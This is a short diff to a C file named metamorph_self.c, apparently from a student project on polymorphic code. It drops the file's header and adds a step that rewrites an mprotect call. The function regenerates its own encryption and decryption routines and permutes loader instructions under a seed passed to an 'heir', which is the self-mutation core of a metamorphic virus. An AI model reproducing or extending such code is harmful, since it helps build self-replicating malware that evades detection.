@@ -1,14 +1,3 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   metamorph_self.c                                   :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
-/*   Updated: 2019/12/20 00:04:45 by anselme          ###   ########.fr       */
-/*                                                                            */
-/* ************************************************************************** */
 
 #include "polymorphism.h"
 #include "errors.h"
@@ -41,11 +30,13 @@ bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2])
 {
 	size_t	cypher_size = (size_t)cypher_end - (size_t)cypher;
 	size_t	loader_size = return_to_client - mark_below; // tmp size
+	size_t mprotect_size = (size_t)mprotect_end - (size_t)mprotect_call;
 
 	if (!yield_seed_to_heir(seed, son_seed)
 	|| !generate_cypher((void *)cypher, son_seed[0], cypher_size)
 	|| !generate_decypher((void *)decypher, son_seed[0], cypher_size)
 	|| !permutate_instructions(mark_below, son_seed[0], loader_size)
+	|| !generate_mprotect((void *)mprotect_call, son_seed[0], mprotect_size)
 	|| !true) // add more metamorphosis above!
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 	return true;
